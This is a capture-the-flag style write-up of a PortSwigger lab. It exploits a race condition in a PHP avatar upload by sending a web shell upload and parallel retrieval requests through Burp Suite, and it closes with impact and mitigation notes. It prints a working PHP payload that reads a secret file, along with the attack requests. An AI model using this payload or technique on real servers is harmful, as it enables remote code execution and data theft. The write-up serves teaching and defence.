# Web Shell Upload via Race Condition

## 📌 Lab Overview

This lab demonstrates a **File Upload Vulnerability** caused by a **Race Condition** in the upload process.

The application temporarily stored uploaded files before performing security checks. This created a small time window where an attacker could access the uploaded file before the application decided whether to keep or delete it.

By exploiting this timing issue, it was possible to execute a malicious PHP web shell and retrieve Carlos's secret.

This lab focused on:

- File Upload Vulnerabilities
- Race Conditions
- TOCTOU (Time-of-Check to Time-of-Use)
- Parallel Requests
- Web Shell Uploads
- Remote Code Execution

---

# 🔍 What is a Race Condition?

A race condition occurs when two or more operations happen at nearly the same time and the final outcome depends on which operation finishes first.

Simple example:

```text
Upload File
↓
Security Check
↓
Delete Malicious File
```

Normally:

```text
Upload
↓
Check
↓
Delete
```

However, if an attacker accesses the file between:

```text
Upload
↓
[Small Time Window]
↓
Delete
```

the attacker wins the race.

This is commonly called:

```text
TOCTOU
(Time Of Check To Time Of Use)
```

---

# 🎯 Objective

The goal of this lab was to:

- identify the race condition
- upload a PHP web shell
- access the file before deletion
- retrieve Carlos's secret
- solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Understanding the Vulnerable PHP Code

![Screenshot 1](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7.png?raw=true)

The lab provided a PHP code snippet explaining how uploads were processed.

```php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
```

The important observation is:

```php
move_uploaded_file(...)
```

The file is moved into the avatars directory **before** any validation occurs.

---

### Vulnerable Logic

After moving the file, the application performs security checks:

```php
if (checkViruses($target_file) &&
    checkFileType($target_file))
{
    echo "The file has been uploaded.";
}
else
{
    unlink($target_file);
}
```

Breaking this down:

```text
Step 1:
Upload file

Step 2:
Move file into avatars directory

Step 3:
Check for viruses

Step 4:
Check file extension

Step 5:
Keep file OR delete file
```

The issue is that:

```text
The file already exists on disk
BEFORE validation completes
```

This creates a small time window:

```text
File Uploaded
↓
Validation Running
↓
File Accessible
↓
Delete File
```

If we access the file during that window, we win the race.

---

### My Initial Logic

What I understood was:

```text
Processing File
↓
Time Used For Validation
(milliseconds)
↓
Decision:
Keep File OR Delete File
```

That tiny gap between:

```text
Upload
↓
Delete
```

is the actual race condition.

The goal was:

```text
Access the file
before deletion happens.
```

---

## Screenshot 2 — Normal Webpage

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(1).png?raw=true)

The application displayed a normal webpage containing a:

```text
My Account
```

button.

---

## Screenshot 3 — Login Page

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(2).png?raw=true)

After clicking **My Account**, I landed on the login page.

The lab provided credentials:

```text
Username: wiener
Password: peter
```

I entered them and logged in.

---

## Screenshot 4 — Avatar Upload Functionality

![Screenshot 4](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(3).png?raw=true)

After logging in as:

```text
wiener
```

I could see:

- Update Email functionality
- Avatar Upload functionality

I uploaded:

```text
luffy.jpg
```

to verify uploads worked correctly.

---

## Screenshot 5 — Successful Image Upload

![Screenshot 5](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(4).png?raw=true)

The application responded:

```text
The file avatars/luffy.jpg has been uploaded.
```

confirming that uploads were working normally.

---

## Screenshot 6 — Attempting a PHP Upload

![Screenshot 6](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(5).png?raw=true)

Back on the My Account page, I selected:

```php
virus.php
```

containing:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

and attempted to upload it.

---

## Screenshot 7 — Upload Rejected

![Screenshot 7](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(6).png?raw=true)

The application responded:

```text
Sorry, only JPG & PNG files are allowed.
Sorry, there was an error uploading your file.
```

This confirmed that PHP files were not allowed.

However, based on the PHP code shown earlier, I knew:

```text
File is uploaded first
↓
Validation occurs later
↓
Deletion happens afterwards
```

The race condition exists before the deletion step.

---

## Screenshot 8 — Capturing the Upload Request

![Screenshot 8](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(7).png?raw=true)

I captured the malicious upload request:

```http
POST /my-account/avatar
```

which uploads:

```php
virus.php
```

This request would be responsible for placing the PHP file on disk.

---

## Screenshot 9 — Preparing the Retrieval Request

![Screenshot 9](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(8).png?raw=true)

I captured another request that would later be modified.

Initially it was:

```http
GET /my-account
```

This request would be converted into a request for the uploaded web shell.

---

## Screenshot 10 — Creating the Race Condition Attack

![Screenshot 10](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(9).png?raw=true)

I modified the GET request to:

```http
GET /files/avatars/virus.php
```

Now I had two requests:

```text
POST /my-account/avatar
```

and

```text
GET /files/avatars/virus.php
```

---

### Logic Behind the Attack

The idea was:

```text
Upload File
↓
Immediately Request File
↓
Hope Request Arrives
Before Deletion
```

What matters is:

```text
POST first
↓
GET immediately after
```

because:

```text
GET before upload
```

makes no sense.

The file doesn't exist yet.

My objective was:

```text
1 Upload Request
+
Many Retrieval Requests
```

For example:

```text
POST
GET
GET
GET
GET
GET
```

The more GET requests I send immediately after upload:

```text
Higher chance of hitting
the file before deletion.
```

Think of it as:

```text
Upload
↓
Tiny Validation Window
↓
Delete

↑
Hit Here
```

We are trying to hit that exact window.

---

## Screenshot 11 — Sending Requests in Parallel

![Screenshot 11](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(10).png?raw=true)

I grouped both requests and selected:

```text
Send Group In Parallel
(Single-Packet Attack)
```

---

### What is a Single-Packet Attack?

A single-packet attack is a Burp Suite feature that sends multiple requests almost simultaneously.

Instead of:

```text
Request 1
(wait)
Request 2
(wait)
Request 3
```

Burp sends:

```text
Request 1
Request 2
Request 3
```

at nearly the same moment.

Benefits:

```text
More Accurate Timing
↓
Better Race Condition Exploitation
↓
Higher Success Rate
```

This greatly increases the chances of reaching the uploaded file before it gets deleted.

---

## Screenshot 12 — Winning the Race

![Screenshot 12](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(11).png?raw=true)

After sending the grouped requests multiple times, one request succeeded.

The server responded:

```text
200 OK
```

and displayed Carlos's secret:

```text
5ug5tEUG6YVYq9sdbetaWjHDDv6T2X6L
```

This confirmed that:

```text
Upload Finished
↓
GET Request Arrived
↓
PHP Executed
↓
Deletion Had Not Happened Yet
```

The race condition was successfully exploited.

---

## Screenshot 13 — Solving the Lab

![Screenshot 13](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Race%20Condition/screenshots/lab7(12).png?raw=true)

I copied Carlos's secret and submitted it using the lab solution banner.

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

```php
move_uploaded_file(...)
```

was executed before validation.

The application workflow became:

```text
Upload File
↓
Store File
↓
Validate File
↓
Delete File
```

instead of:

```text
Validate File
↓
Store File
```

This allowed temporary access to malicious files.

---

# 💥 Impact

An attacker could potentially:

- execute arbitrary code
- upload web shells
- bypass security checks
- read sensitive files
- compromise the application
- gain server access

---

# 🛡 Mitigation

To prevent race condition vulnerabilities:

- validate files before storing them
- store uploads outside the web root
- use temporary directories
- prevent access during validation
- perform atomic file operations

Secure workflow:

```text
Upload File
↓
Validate File
↓
Store File
↓
Make Accessible
```

---

# 🧠 Skills Learned

- File Upload Testing
- Race Condition Discovery
- TOCTOU Vulnerabilities
- Single-Packet Attacks
- Parallel Request Execution
- Web Shell Upload Techniques
- Remote Code Execution

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Burp Parallel Requests
- Browser Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how a race condition in the file upload process can lead to Remote Code Execution.

The application stored uploaded files before validating them, creating a brief time window where malicious files were accessible.

By combining:

```text
1 Upload Request
+
Multiple Retrieval Requests
```

and sending them simultaneously using Burp Suite's single-packet attack feature, I successfully accessed the PHP web shell before it was deleted.

The web shell executed and revealed Carlos's secret, allowing the lab to be solved successfully.

Through this lab, I learned:

- how race conditions occur
- what TOCTOU vulnerabilities are
- how upload validation can be bypassed through timing attacks
- how Burp Suite's parallel request features help exploit race conditions
- how temporary file exposure can lead to Remote Code Execution
